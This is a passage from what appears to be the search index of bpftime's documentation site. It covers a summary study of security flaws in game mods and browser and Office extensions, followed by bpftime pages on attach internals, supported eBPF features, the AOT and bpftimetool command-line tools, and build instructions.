folder (CVEfeed) A malicious backup could overwrite critical files or plant malware, affecting system integrity Fixed in Advanced Backups v3.6.0; update and use trusted backups only. <p>Note: The last several Minecraft mod cases (ServerRPExposer, ARRP, MCRPX, Reden, Advanced Backups) were all discovered as part of a coordinated disclosure in 2024 regarding Zip file path traversal in mods (Vulnerability research report for Minecraft mods. \u00b7 GitHub). The technical root cause in each was the same: failure to check for <code>..</code> or absolute paths when extracting archives, a well-known issue that can lead to files written outside the intended directory (Vulnerability research report for Minecraft mods. \u00b7 GitHub). Mod developers quickly released patches once informed, underscoring the importance of secure coding even in game mods.</p>"},{"location":"bpftime/EIM/study/game-office-bug-study/#patterns-in-extensionplugin-bugs","title":"Patterns in Extension/Plugin Bugs","text":"<p>Analyzing the above cases reveals several common patterns:</p> <ul> <li> <p>Insufficient Input Validation: A majority of these bugs stem from not validating input data that the extension/plugin receives. For example, many Minecraft mods did not validate filenames inside zip archives, leading to path traversal exploits (Vulnerability research report for Minecraft mods. \u00b7 GitHub). Similarly, the WebEx extension didn\u2019t properly sanitize incoming messages (Critical RCE Vulnerability Found in Cisco WebEx Extensions, Again \u2014 Patch Now!), and LastPass/Grammarly failed to validate or restrict what web pages could do with their extension APIs (Grammarly Patches Chrome Extension Bug That Exposed Users\u2019 Docs | Threatpost) (NVD - CVE-2019-16371). In short, untrusted data (whether from a document, network packet, or web page) was often trusted by the extension \u2013 resulting in XXE, XSS, RCE, or logic bugs.</p> </li> <li> <p>Over-privileged or Misused APIs: Extensions frequently run with elevated privileges or deep integration, and a bug can abuse that. The Evernote and Grammarly cases show how a logic flaw can break the browser\u2019s normal security model \u2013 e.g., Evernote\u2019s bug broke Chrome\u2019s domain isolation, allowing one site to access data from others (Evernote Chrome Extension Vulnerability: Guardio's Analysis). In essence, the extension\u2019s broad permissions (meant to help the user clip web content or check grammar everywhere) became a liability when the extension misbehaved. Likewise, Outlook add-ins like MailStore\u2019s and KnowBe4\u2019s had the ability to connect to servers or update software; without proper checks (certificate validation, update signature verification), those abilities turned into vulnerabilities (CVE - Search Results) (CVE -Search Results).</p> </li> <li> <p>Design/Logic Flaws due to Complexity: Some bugs were not low-level memory errors, but high-level logic issues \u2013 e.g., LastPass\u2019s credential leak was due to UI logic and clickjacking, not a buffer overflow. These arise from the complex interactions extensions have (UI events, multiple contexts, etc.). Tavis Ormandy noted that such issues often evade automated detection and require careful human review (Grammarly Patches Chrome Extension Bug That Exposed Users\u2019 Docs | Threatpost). In game mods, logic flaws like item duplication (JEI/REI) were likely overlooked in testing since they don\u2019t crash the game \u2013 they break game rules.</p> </li> <li> <p>Lack of Security Focus in Third-Party Development: Many of these extensions/plugins are by third parties (e.g., SAP add-in, mods by community developers, even large companies like Cisco or LastPass). In several cases, the core application might be secure, but the extension opened a hole. For instance, Microsoft Office itself wasn\u2019t vulnerable, but the SAP add-in introduced an XXE flaw (CVE-2021-21470 : SAP EPM Add-in for Microsoft Office, version - 1010 and SAP EPM Add-in for SAP A). The patterns suggest that extension developers might not have the same security rigorous processes as the platform vendor. Community mod developers, in particular, historically focused on functionality over security, leading to decades-old bugs like directory traversal persisting (Vulnerability research report for Minecraft mods. \u00b7 GitHub).</p> </li> <li> <p>Updates and Sandbox Mechanisms: Some patterns involve how extensions update or isolate code. KnowBe4\u2019s PAB add-in didn\u2019t verify update integrity (CVE - Search Results ), a pattern also seen in other software supply chain attacks (not unique to extensions, but very relevant as extensions often auto-update). On the flip side, failures to sandbox execution appear in mods like OpenComputers (Lua thread running on the main server thread) and in WebEx (exposing native code execution to webpages). Extensions that execute code (scripts, macros, etc.) need strong sandboxing; when that fails, the host is at risk.</p> </li> </ul>"},{"location":"bpftime/EIM/study/game-office-bug-study/#impact-on-stability-maintainability-and-security","title":"Impact on Stability, Maintainability, and Security","text":"<p>Bugs in extensions/plugins can have outsized impacts on the host system\u2019s stability, maintainability, and security:</p> <ul> <li> <p>Stability: A flawed plugin can severely affect the stability of the host application or system. We saw how a single mod (OpenComputers) could hang an entire game server (CVE - Search Results ). Office add-ins have been known to crash Outlook or Excel if they mis-handle memory or events (e.g., the SAP add-in could have caused errors if malicious XML triggered odd behavior). Because extensions run in-process with their host, a crash in an extension crashes the host app. For example, a buggy Outlook add-in can make Outlook unrecoverable until disabled (Outlook Slow/Crashes - Slow and Disabled Add-ins). In gaming, mods that leak memory or CPU (infinite loops, excessive item spawn) can make a game unplayable. Thus, a seemingly optional add-on can undermine the reliability of the entire platform.</p> </li> <li> <p>Maintainability: Extensions add complexity to a system, which can hurt maintainability. Each bug requires coordination between the plugin developer and the host environment. If an extension is popular (like WebEx or LastPass), multiple updates might be rushed (as in 2017, WebEx needed a second patch) which can be challenging to manage for IT admins and users. In mods, once a vulnerability is found, maintainers have to quickly release fixes and users need to update mods across potentially thousands of servers or clients \u2013 not an easy task. Additionally, plugin ecosystems often have dependencies (e.g., ARRP library mod affecting other mods (Vulnerability research report for Minecraft mods. \u00b7 GitHub)), so one fix might require many projects to update, complicating maintenance. Poorly designed extensions (no auto-update or code signing, etc.) increase the maintenance burden on users to manually track and install safe versions.</p> </li> <li> <p>Security: Perhaps the most significant impact is on overall system security. Extensions and mods expand the attack surface of the host application. A secure core application can be undermined by an insecure plugin. For instance, Chrome\u2019s robust isolation was bypassed by the Evernote and Grammarly extensions\u2019 bugs (Evernote Chrome Extension Vulnerability: Guardio's Analysis) (Grammarly Patches Chrome Extension Bug That Exposed Users\u2019 Docs | Threatpost). A password manager like LastPass, meant to improve security, briefly exposed passwords due to its extension flaw (NVD - CVE-2019-16371). Many extensions run with elevated privileges (browser extensions can often read/modify all websites data, Office add-ins can access documents, game mods can run code in the game engine). As a result, any vulnerability can lead to a full compromise: WebEx\u2019s extension allowed complete remote code execution on Windows (CVE-2017-3823 : An issue was discovered in the Cisco WebEx Extension before 1.0.7 on Google Chro). In enterprise settings, something like the KnowBe4 add-in bug could let an attacker pivot into a corporate network via a simple Outlook plugin exploit. In summary, extensions often operate at a high trust level; when they go wrong, they can violate user trust, breach data confidentiality, or open the door to malware.</p> </li> <li> <p>Security Maintenance Debt: From a process perspective, extension bugs highlight the importance of keeping plugins updated. Users often install extensions and forget about them. As Guardio noted, browser extensions can be risky and need to be maintained and updated just like any software (Evernote Chrome Extension Vulnerability: Guardio's Analysis). Unpatched extensions become lingering vulnerabilities (for example, someone still using an old WebEx plugin in 2018 would be an easy target). This creates a maintainability challenge: both users and platform providers must vigilantly manage extensions (browsers now can remotely disable known-bad extensions, Office might disable crashing add-ins (Add-ins decreased performance or caused Outlook to crash)). The need for frequent updates to fix bugs can itself be a source of security risk if the update mechanism is not secure (as seen with the PAB case).</p> </li> <li> <p>Impact Beyond the App (Systemic effects): Some plugin flaws have consequences beyond just the immediate app. The cloud metadata mod exploits show how a vulnerability in a game mod can escalate to cloud infrastructure compromise (CVE - Search Results ). Similarly, an Office add-in with a vulnerability could be a stepping stone for a targeted attack (e.g., a malicious document that exploits an add-in to run code). Thus, the security impact can range from local (game cheating, app crash) to systemic (network breach, malware installation).</p> </li> </ul> <p>In conclusion, extension/plugin bugs frequently follow patterns of unchecked inputs, improper privilege use, and inadequate isolation. These bugs can severely impact stability (crashes, hangs), erode maintainability (requiring urgent patches and careful version control), and punch holes in security defenses (leading to data leaks or code execution). The collection of cases from 2018\u20132024 demonstrates that while extensions enhance functionality, they must be developed and reviewed with the same rigor as core software \u2013 otherwise, they become the weakest link in the chain. As one security research team put it, browser extensions can be very powerful and thus very risky if not properly maintained (Evernote Chrome Extension Vulnerability: Guardio's Analysis). The same holds true for any platform: the host is only as secure and stable as the plugins it loads.</p> <p>Share on  Share on </p>"},{"location":"bpftime/documents/attach/","title":"Detailed Implementation of the Attach Part","text":""},{"location":"bpftime/documents/attach/#a-brief-description","title":"A Brief Description","text":"<p>Attach is an important part of bpftime.</p> <p><code>Attach</code> refers to connecting eBPF programs stored in memory to some userspace hook point. Such hook points could be a userspace function in a certain process, a syscall invocation, or something similar. When the hook point is triggered, the connected eBPF program is called automatically. The whole process is managed by bpftime.</p> <p>bpftime itself comes with two types of attach implementations: uprobe and syscall. - uprobe: Hooks a userspace function in a certain process, monitoring the arguments and return value, or modifying the return value based on conditions. - syscall: Hooks calls to some or all syscall IDs in a certain process. It monitors arguments or return values of the syscall, or replaces the syscall implementation.</p> <p>The attach implementations above are similar to <code>uprobe</code> and <code>tracepoint/syscalls/sys_[enter/exit]_XXXX</code> in the kernel, with some enhancements.</p>"},{"location":"bpftime/documents/attach/#targets-libraries-in-bpftime-related-to-attach","title":"Targets (Libraries) in bpftime Related to Attach","text":""},{"location":"bpftime/documents/attach/#base_attach_impl","title":"base_attach_impl","text":"<p>This is a header-only library, providing abstractions for all attach implementations. There are two major classes: <code>base_attach_impl</code> and <code>attach_private_data</code>.</p> <p><code>base_attach_impl</code> is the base class for all attach implementations. It is composed of several pure virtual functions, including functions to detach a certain attach entry and create an attach entry with a unified interface.</p> <p><code>attach_private_data</code> is the base class for all attach private data. Since we can only access a certain attach implementation through the unified interface, we also need a unified interface to pass attach-specific data to the attach implementation. Such data are called <code>attach private data</code></p>"},{"location":"bpftime/documents/attach/#frida_uprobe_attach_impl","title":"frida_uprobe_attach_impl","text":"<p>A Frida-based uprobe attach implementation. It implements the following attach types: - UPROBE: Similar to <code>uprobe</code> in kernel eBPF, invoked at the entrance of a certain userspace function. It can access the arguments of the hooked function. - URETPROBE: Similar to <code>uretprobe</code> in kernel eBPF, invoked at the exit of a certain userspace function. It can access the return value of the hooked function.</p> <p>UPROBE and URETPROBE are implemented using <code>GUM_INVOCATION_LISTENER</code>.</p> <ul> <li>UPROBE_OVERRIDE: Invoked when the function enters, it can access arguments of the hooked function, and decide whether to override the return value and bypass the hooked function. It could be used to replace the hooked function or replace the return value based on arguments.</li> </ul> <p>UFILTER are implemented using <code>gum_interceptor_replace</code></p>"},{"location":"bpftime/documents/attach/#syscall_trace_attach_impl","title":"syscall_trace_attach_impl","text":"<p>A zpoline-based userspace syscall trace implementation. It rewrites the code segment to trace syscalls in userspace, eliminating the need to modify the executable.</p> <p>It provides the attach type SYSCALL_TRACEPOINT, which is triggered when the userspace process emits a syscall. It can monitor the arguments, invoke the original syscall, and replace the syscall.</p> <p>It is similar to <code>tracepoint/syscalls/sys_[enter/exit]_XXXX</code> in the kernel eBPF.</p>"},{"location":"bpftime/documents/attach/#runtime","title":"Runtime","text":"<p>This is the core part of bpftime and an important part of attaching.</p> <p>User applications, such as bpftime-agent, should register attach implementations to <code>bpf_attach_ctx</code>, a class managed by runtime. In this way, runtime doesn't need to depend on concrete attach implementations; it just needs to depend on <code>base_attach_impl</code>, which provides a general interface for all attach implementations.</p> <p>When the user application wants to instantiate an attach, which means: - Creating an eBPF virtual machine based on eBPF programs stored in memory. - Creating attach private data through the unified interface from perf events stored in memory. - Creating an attach entry through the unified interface.</p> <p>runtime will iterate over all handlers stored in memory and handle different types. The type related to attach is <code>bpf_link_handler</code>, which records the relationship between <code>bpf_prog_handler</code> and <code>perf_event_handler</code>, meaning when the specified perf event is triggered, the corresponding eBPF program should be called.</p> <p>runtime will call <code>create_attach_with_ebpf_callback</code> to create an attach entry. This function is provided by <code>base_attach_impl</code> and implemented by various attach implementations. runtime will generate the attach private data using the registered attach private data generator and create a lambda callback to call the corresponding eBPF program. After attaching, runtime will record the attach entry ID for future purposes (such as detachment).</p> <p>Share on  Share on </p>"},{"location":"bpftime/documents/available-features/","title":"Available kernel features in userspace","text":""},{"location":"bpftime/documents/available-features/#table-of-contents","title":"Table of Contents","text":"<ul> <li>Available kernel features in userspace</li> <li>Table of Contents</li> <li>availbale map types</li> <li>avaliable program types</li> <li>available helpers<ul> <li>maps</li> <li>kernel_helper_group</li> </ul> </li> <li>Others</li> </ul>"},{"location":"bpftime/documents/available-features/#availbale-map-types","title":"availbale map types","text":"<p>Userspace eBPF shared memory map types:</p> <ul> <li>BPF_MAP_TYPE_HASH</li> <li>BPF_MAP_TYPE_ARRAY</li> <li>BPF_MAP_TYPE_RINGBUF</li> <li>BPF_MAP_TYPE_PERF_EVENT_ARRAY</li> <li>BPF_MAP_TYPE_PERCPU_ARRAY</li> <li>BPF_MAP_TYPE_PERCPU_HASH</li> </ul> <p>User-kernel shared maps:</p> <ul> <li>BPF_MAP_TYPE_HASH</li> <li>BPF_MAP_TYPE_ARRAY</li> <li>BPF_MAP_TYPE_PERCPU_ARRAY</li> <li>BPF_MAP_TYPE_PERF_EVENT_ARRAY</li> </ul>"},{"location":"bpftime/documents/available-features/#avaliable-program-types","title":"avaliable program types","text":"<p>Compatible with kernel eBPF program types:</p> <ul> <li>tracepoint:raw_syscalls:sys_enter</li> <li>tracepoint:syscalls:sys_exit_*</li> <li>tracepoint:syscalls:sys_enter_*</li> <li>uretprobe:*</li> <li>uprobe:*</li> <li>usdt:*</li> </ul>"},{"location":"bpftime/documents/available-features/#available-helpers","title":"available helpers","text":""},{"location":"bpftime/documents/available-features/#maps","title":"maps","text":"<ul> <li><code>bpf_map_lookup_elem</code>: Helper function for looking up an element in a BPF map.</li> <li><code>bpf_map_update_elem</code>: Helper function for updating an element in a BPF map.</li> <li><code>bpf_map_delete_elem</code>: Helper function for deleting an element from a BPF map.</li> <li><code>bpf_perf_event_output</code> for perf events</li> <li><code>bpf_ringbuf_submit</code> for submitting ring buffer events</li> <li><code>bpf_ringbuf_reserve</code> for reserving space for ring buffer</li> </ul>"},{"location":"bpftime/documents/available-features/#kernel_helper_group","title":"kernel_helper_group","text":"<ul> <li><code>bpf_probe_read</code>, <code>bpf_probe_read_user</code>: Helper function for reading data from a userspace address.</li> <li><code>bpf_probe_write_user</code>: Helper function for writing data to userspace</li> <li><code>bpf_ktime_get_ns</code>, <code>bpf_ktime_get_coarse_ns</code>: Helper function for getting the current time in nanoseconds.</li> <li><code>bpf_trace_printk</code>: Helper function for printing debug messages from eBPF programs.</li> <li><code>bpf_get_current_pid_tgid</code>: Helper function for getting the current PID and TGID (Thread Group ID).</li> <li><code>bpf_get_current_uid_gid</code>: Helper function for getting the current UID (User ID) and GID (Group ID).</li> <li><code>bpf_get_current_comm</code>: Helper function for getting the current process's name.</li> <li><code>bpf_strncmp</code>: Helper function for comparing two strings.</li> <li><code>bpf_get_func_arg</code>: Helper function for getting the value of a function argument.</li> <li><code>bpf_get_func_ret</code>: Helper function for getting the value of a function return ID.</li> <li><code>bpf_get_retval</code>: Helper function for getting the return value of a function.</li> <li><code>bpf_set_retval</code>: Helper function for setting the return value of a function.</li> <li><code>bpf_probe_read_str</code>: Helper function for reading a null-terminated string from a user address.</li> <li><code>bpf_tail_call</code>: tail call another userspace eBPF function or kernel eBPF programs</li> <li><code>bpftime_get_prandom_u32</code>: get random value</li> <li><code>bpf_override_return</code>: change the control flow of the functions</li> </ul> <p>Note: new helpers may be added without a document updated. Please see https://github.com/eunomia-bpf/bpftime/blob/master/runtime/src/bpf_helper.cpp for more details.</p>"},{"location":"bpftime/documents/available-features/#others","title":"Others","text":"<ul> <li>Support kernel or userspace verifier</li> <li>JIT/AOT support</li> <li>Test JIT with bpf_conformance</li> </ul> <p>Share on  Share on </p>"},{"location":"bpftime/documents/bpftimeaot/","title":"bpftime-aot cli","text":"<p>An cli for help to compile eBPF to native ELF.</p> <p>It can be used to compile eBPF insns to native insns with helpers, maps define, or load native ELF to run in the userspace runtime.</p> <p>The tool can be found in https://github.com/eunomia-bpf/bpftime/tree/master/tools/aot</p> <p>If you are looking for a library, please see https://github.com/eunomia-bpf/llvmbpf</p>"},{"location":"bpftime/documents/bpftimeaot/#usage","title":"Usage","text":"<pre><code># bpftime-aot help\nUsage: /home/yunwei/ebpf-xdp-dpdk/build-bpftime/bpftime/tools/aot/bpftime-aot [--help] [--version] {build,compile,run}\n\nOptional arguments:\n  -h, --help     shows help message and exits \n  -v, --version  prints version information and exits \n\nSubcommands:\n  build         Build native ELF(s) from eBPF ELF. Each program in the eBPF ELF will be built into a single native ELF\n  compile       Compile the eBPF program loaded in shared memory\n  run           Run an native eBPF program\n</code></pre>"},{"location":"bpftime/documents/bpftimeaot/#build-elf-from-shared-mnemory-and-use-it-with-helpers-and-maps","title":"Build ELF from shared mnemory and use it with helpers and maps","text":"<p>load the eBPF programs and maps to shared memory:</p> <pre><code>LD_PRELOAD=build/runtime/syscall-server/libbpftime-syscall-server.so example/malloc/malloc\n</code></pre> <p>The eBPF code here is:</p> <pre><code>#define BPF_NO_GLOBAL_DATA\n#include &lt;vmlinux.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n\nstruct {\n    __uint(type, BPF_MAP_TYPE_HASH);\n    __uint(max_entries, 1024);\n    __type(key, u32);\n    __type(value, u64);\n} libc_malloc_calls_total SEC(\".maps\");\n\nstatic int increment_map(void *map, void *key, u64 increment)\n{\n    u64 zero = 0, *count = bpf_map_lookup_elem(map, key);\n    if (!count) {\n        bpf_map_update_elem(map, key, &amp;zero, BPF_NOEXIST);\n        count = bpf_map_lookup_elem(map, key);\n        if (!count) {\n            return 0;\n        }\n    }\n    u64 res = *count + increment;\n    bpf_map_update_elem(map, key, &amp;res, BPF_EXIST);\n\n    return *count;\n}\n\nSEC(\"uprobe/libc.so.6:malloc\")\nint do_count(struct pt_regs *ctx)\n{\n    u32 pid = bpf_get_current_pid_tgid() &gt;&gt; 32;\n\n    bpf_printk(\"malloc called from pid %d\\n\", pid);\n\n    increment_map(&amp;libc_malloc_calls_total, &amp;pid, 1);\n\n    return 0;\n}\n\nchar LICENSE[] SEC(\"license\") = \"GPL\";\n</code></pre> <p>then build the native ELF from shared memory:</p> <pre><code>bpftime-aot compile\n</code></pre> <p>You will get a native ELF file named <code>do_count.o</code>.</p> <p>You can link it with your program and execute it:</p> <pre><code>cd bpftime/tools/aot/example\nclang -O2 main.c do_count.o -o malloc\n</code></pre> <p>The drive program is like:</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;stdlib.h&gt;\n\nint bpf_main(void* ctx, uint64_t size);\n\n// bpf_printk\nuint64_t _bpf_helper_ext_0006(uint64_t fmt, uint64_t fmt_size, ...)\n{\n    const char *fmt_str = (const char *)fmt;\n    va_list args;\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored \"-Wformat-nonliteral\"\n#pragma GCC diagnostic ignored \"-Wvarargs\"\n    va_start(args, fmt_str);\n    long ret = vprintf(fmt_str, args);\n#pragma GCC diagnostic pop\n    va_end(args);\n    return 0;\n}\n\n// bpf_get_current_pid_tgid\nuint64_t _bpf_helper_ext_0014(void)\n{\n    static int tgid = -1;\n    static int tid = -1;\n    if (tid == -1)\n        tid = gettid();\n    if (tgid == -1)\n        tgid = getpid();\n    return ((uint64_t)tgid &lt;&lt; 32) | tid;\n}\n\n// here we use an var to mock the map.\nuint64_t counter_map = 0;\n\n// bpf_map_lookup_elem\nvoid * _bpf_helper_ext_0001(void *map, const void *key)\n{\n    printf(\"bpf_map_lookup_elem\\n\");\n    return &amp;counter_map;\n}\n\n// bpf_map_update_elem\nlong _bpf_helper_ext_0002(void *map, const void *key, const void *value, uint64_t flags)\n{\n    printf(\"bpf_map_update_elem\\n\");\n    if (value == NULL) {\n        printf(\"value is NULL\\n\");\n        return -1;\n    }\n    uint64_t* value_ptr = (uint64_t*)value_ptr;\n    counter_map = *value_ptr;\n    printf(\"counter_map: %lu\\n\", counter_map);\n    return 0;\n}\n\nuint64_t __lddw_helper_map_by_fd(uint32_t id) {\n    printf(\"map_by_fd\\n\");\n    return 0;\n}\n\nint main() {\n    printf(\"Hello, World!\\n\");\n    bpf_main(NULL, 0);\n    return 0;\n}\n</code></pre> <p>Note by loading eBPF programs with libbpf and LD_PRELOAD, maps, global variables, and helpers are already relocated in shared memory, so you can use them directly in your program. For example, the input of <code>__lddw_helper_map_by_fd</code> function would be the actual map id in shared memory.</p> <p>You can refer to <code>example/malloc.json</code> for details about how the maps are relocated.</p>"},{"location":"bpftime/documents/bpftimeaot/#compile-from-ebpf-bytecode-elf","title":"Compile from eBPF bytecode ELF","text":"<p>You can also compile the eBPF bytecode ELF to native ELF:</p> <pre><code>bpftime-aot build bpftime/example/minimal/.output/uprobe.bpf.o -e\n</code></pre> <p>In this way, the relocation of maps, global variables, and helpers will not be done. The helpers is still works.</p>"},{"location":"bpftime/documents/bpftimeaot/#run-native-elf","title":"run native ELF","text":"<p>Given a eBPF code:</p> <pre><code>#define BPF_NO_GLOBAL_DATA\n#include &lt;vmlinux.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n\nSEC(\"uprobe/./victim:target_func\")\nint do_uprobe_trace(struct pt_regs *ctx)\n{\n    bpf_printk(\"target_func called.\\n\");\n    return 0;\n}\n\nchar LICENSE[] SEC(\"license\") = \"GPL\";\n</code></pre> <p>The native C code after relocation is like:</p> <pre><code>int _bpf_helper_ext_0006(char* arg0);\n\nint bpf_main(void *ctx)\n{\n    _bpf_helper_ext_0006(\"target_func called.\\n\");\n    return 0;\n}\n</code></pre> <p>Compile it with <code>clang -O3 -c -o do_uprobe_trace.o do_uprobe_trace.c</code>, and you can load it with AOT runtime.</p> <p>You can simply run the native ELF:</p> <pre><code># bpftime-aot run do_uprobe_trace.o \n[2024-03-24 21:57:53.446] [info] [llvm_jit_context.cpp:81] Initializing llvm\n[2024-03-24 21:57:53.446] [info] [llvm_jit_context.cpp:204] LLVM-JIT: Loading aot object\ntarget_func called.\n[2024-03-24 21:57:53.449] [info] [main.cpp:190] Output: 0\n</code></pre>"},{"location":"bpftime/documents/bpftimeaot/#emit-llvm-ir","title":"emit llvm ir","text":"<pre><code>bpftime-aot compile -e\n</code></pre> <p>or:</p> <pre><code>bpftime-aot build -e minimal.bpf.o\n</code></pre> <p>Share on  Share on </p>"},{"location":"bpftime/documents/bpftimetool/","title":"bpftimetool","text":"<p>Similar to bpftool, bpftimetool is tools to inspect or operate the shared memory status of the target process.</p> <p>It supports:</p> <ul> <li>serialize the shared memory status to json</li> <li>load the json and restore the status in shared memory</li> <li>run ebpf program (XDP or others) and measure the time</li> </ul> <p>The tool can be found in https://github.com/eunomia-bpf/bpftime/tree/master/tools/bpftimetool</p> <p>You may also use bpftool with the syscall server.</p>"},{"location":"bpftime/documents/bpftimetool/#export-data-in-json","title":"Export data in json","text":"<pre><code>$ ~/.bpftime/bpftimetool export res.json\n[2023-10-23 18:45:25.893] [info] Global shm constructed. shm_open_type 1 for bpftime_maps_shm\n[2023-10-23 18:45:25.894] [info] bpf_map_handler name=.rodata.str1.1 found at 3\n[2023-10-23 18:45:25.894] [info] find prog fd=4 name=do_uprobe_trace\n[2023-10-23 18:45:25.894] [info] bpf_perf_event_handler found at 5\nINFO [93828]: Global shm destructed\n</code></pre>"},{"location":"bpftime/documents/bpftimetool/#import-data-from-json","title":"Import data from json","text":"<pre><code>SPDLOG_LEVEL=Debug ~/.bpftime/bpftimetool import /home/yunwei/bpftime/tools/bpftimetool/minimal.json\n[2023-10-23 19:02:04.955] [info] Global shm constructed. shm_open_type 3 for bpftime_maps_shm\n[2023-10-23 19:02:04.955] [info] import handler fd 3 {\"attr\":{\"btf_id\":2,\"btf_key_type_id\":0,\"btf_value_type_id\":0,\"btf_vmlinux_value_type_id\":0,\"flags\":128,\"ifindex\":0,\"key_size\":4,\"map_extra\":0,\"map_type\":2,\"max_entries\":1,\"value_size\":21},\"name\":\".rodata.str1.1\",\"type\":\"bpf_map_handler\"}\n[2023-10-23 19:02:04.955] [info] import handler type bpf_map_handler fd 3\n[2023-10-23 19:02:04.956] [info] import handler fd 4 {\"attr\":{\"attach_fds\":[5],\"cnt\":16,\"insns\":\"b701000065642e0a631af8ff0000000018010000756e63200000000063616c6c7b1af0ff0000000018010000746172670000000065745f667b1ae8ff00000000b701000000000000731afcff00000000bfa100000000000007010000e8ffffffb7020000150000008500000006000000b7000000000000009500000000000000\",\"type\":0},\"name\":\"do_uprobe_trace\",\"type\":\"bpf_prog_handler\"}\n[2023-10-23 19:02:04.956] [info] import handler type bpf_prog_handler fd 4\n[2023-10-23 19:02:04.956] [info] import handler fd 5 {\"attr\":{\"_module_name\":\"example/minimal/victim\",\"offset\":4457,\"pid\":-1,\"ref_ctr_off\":0,\"tracepoint_id\":-1,\"type\":6},\"type\":\"bpf_perf_event_handler\"}\n[2023-10-23 19:02:04.956] [info] import handler type bpf_perf_event_handler fd 5\nINFO [99712]: Global shm destructed\n</code></pre> <p>Share on  Share on </p>"},{"location":"bpftime/documents/build-and-test/","title":"Building and Test","text":""},{"location":"bpftime/documents/build-and-test/#table-of-contents","title":"Table of Contents","text":"<ul> <li>Building and Test</li> <li>Table of Contents</li> <li>Use docker image</li> <li>Install Dependencies<ul> <li>Build and install all things</li> </ul> </li> <li>Detailed things about building<ul> <li>build options</li> <li>Build and install the complete runtime in release mode(With ubpf jit)</li> <li>Build and install the complete runtime in debug mode(With ubpf jit)</li> <li>Build and install the complete runtime in release mode(With llvm jit)</li> <li>Compile with LTO enabled</li> <li>Compile with userspace verifier</li> <li>Compile with libbpf disabled</li> <li>Testing targets</li> </ul> </li> <li>Compile only the vm (No runtime, No uprobe)</li> <li>More compile options</li> </ul>"},{"location":"bpftime/documents/build-and-test/#use-docker-image","title":"Use docker image","text":"<p>We provide a docker image for building and testing bpftime.</p> <pre><code># run the container\ndocker run -it --rm --name test_bpftime -v \"$(pwd)\":/workdir -w /workdir ghcr.io/eunomia-bpf/bpftime:latest /bin/bash\n# start another shell in the container (If needed)\ndocker exec -it test_bpftime /bin/bash\n</code></pre> <p>Or build the docker from dockerfile:</p> <pre><code>git submodule update --init --recursive\ndocker build .\n</code></pre>"},{"location":"bpftime/documents/build-and-test/#install-dependencies","title":"Install Dependencies","text":"<p>Install the required packages:</p> <pre><code>sudo apt-get update &amp;&amp; sudo apt-get install \\\n        libelf1 libelf-dev zlib1g-dev make cmake git libboost-all-dev \\\n        binutils-dev libyaml-cpp-dev ca-certificates clang llvm pkg-config llvm-dev\ngit submodule update --init --recursive\n</code></pre> <p>We've tested on Ubuntu 23.04. The recommended <code>gcc</code> &gt;= 12.0.0 <code>clang</code> &gt;= 16.0.0. It's recommanded to use <code>libboost1.74-all-dev</code>.</p> <p>On Ubuntu 20.04, you may need to manually switch to gcc-12.</p>"},{"location":"bpftime/documents/build-and-test/#build-and-install-all-things","title":"Build and install all things","text":"<p>Install all things that could be installed to <code>~/.bpftime</code>, includes:</p> <ul> <li><code>bpftime</code>: A cli tool used for injecting agent &amp; server to userspace programs</li> <li><code>bpftime-vm</code>: A cli tool used for compiling eBPF programs into native programs, or run the compiled program</li> <li><code>bpftimetool</code>: A cli tool used to manage things stored in shared memory, such as the data of maps or programs</li> <li><code>bpftime_daemon</code>: An executable used for implementing the similar thing like syscall server, but don't need to be injected to the userspace program</li> <li><code>libbpftime-agent.so</code>, <code>libbpftime-agent-transformer.so</code>: Libraries needed by bpftime agent</li> <li><code>libbpftime-syscall-server.so</code>: Library needed by bpftime syscall server</li> </ul> <p>Build with makefile:</p> <pre><code>make release JOBS=$(nproc) # Build and install the runtime\nexport PATH=$PATH:~/.bpftime\n</code></pre> <p>Or you can also build with <code>cmake</code>(The Makefile is a wrapper of cmake commands):</p> <pre><code>cmake -Bbuild  -DCMAKE_BUILD_TYPE:STRING=Release \\\n           -DSPDLOG_ACTIVE_LEVEL=SPDLOG_LEVEL_INFO\ncmake --build build --config Release --target install\nexport PATH=$PATH:~/.bpftime\n</code></pre> <p>Then you can run cli:</p> <pre><code>$ bpftime\nUsage: bpftime [OPTIONS] &lt;COMMAND&gt;\n...\n</code></pre> <p>See the Makefile for some common commands.</p>"},{"location":"bpftime/documents/build-and-test/#detailed-things-about-building","title":"Detailed things about building","text":"<p>We use cmake as build system.</p>"},{"location":"bpftime/documents/build-and-test/#build-options","title":"build options","text":"<p>You may be interested in the following cmake options:</p> <ul> <li><code>CMAKE_BUILD_TYPE</code>: Specify the build type. It could be <code>Debug</code>, <code>Release</code>, <code>MinSizeRel</code> or <code>RelWithDebInfo</code>. If you are not going to debug bpftime, you just need to set it to <code>Release</code>. Default to <code>Debug</code>.</li> <li><code>BPFTIME_ENABLE_UNIT_TESTING</code>: Whether to build unit test targets. See <code>Testing targets</code> for details. Default to <code>NO</code>.</li> <li><code>BPFTIME_ENABLE_LTO</code>: Whether to enable Link Time Optimization. Enabling this may increase the compile time, but it may lead to a better performance. Default to <code>No</code>.</li> <li><code>ENABLE_EBPF_VERIFIER</code>: Whether to enable userspace eBPF verifier</li> <li><code>BPFTIME_LLVM_JIT</code>: Whether to use LLVM JIT as the ebpf runtime. Requires LLVM &gt;= 15. It's recommended to enable this, since the ubpf intepreter is no longer maintained. Default to <code>NO</code>.</li> <li><code>LLVM_DIR</code>: Specify the installing directory of LLVM. CMake may not discover the LLVM installation by default. Set this option to the directory that contains <code>LLVMConfig.cmake</code>, such as <code>/usr/lib/llvm-15/cmake</code> on Ubuntu</li> <li><code>BUILD_BPFTIME_DAEMON</code>: Build with the daemon for load the eBPF program into hkernel and se kernel verifier.</li> <li><code>BPFTIME_BUILD_WITH_LIBBPF</code> :Build bpftime without libbpf. It can only be run in userspace with this enabled, but it can be easily port into other platform, e.g. macOS.</li> <li><code>BPFTIME_BUILD_STATIC_LIB</code>: Build bpftime runtime into a whole static libraries. It can be easily linked into other programs.</li> <li><code>ENABLE_PROBE_WRITE_CHECK</code>: Enable the probe write check. It will check the bpf_probe_write_user operation and report the error if the probe write address is invalid.</li> <li><code>ENABLE_PROBE_READ_CHECK</code>: Enable the probe read check. It will check the bpf_probe_write operation and report the error if the probe read address is invalid.</li> </ul> <p>Please see 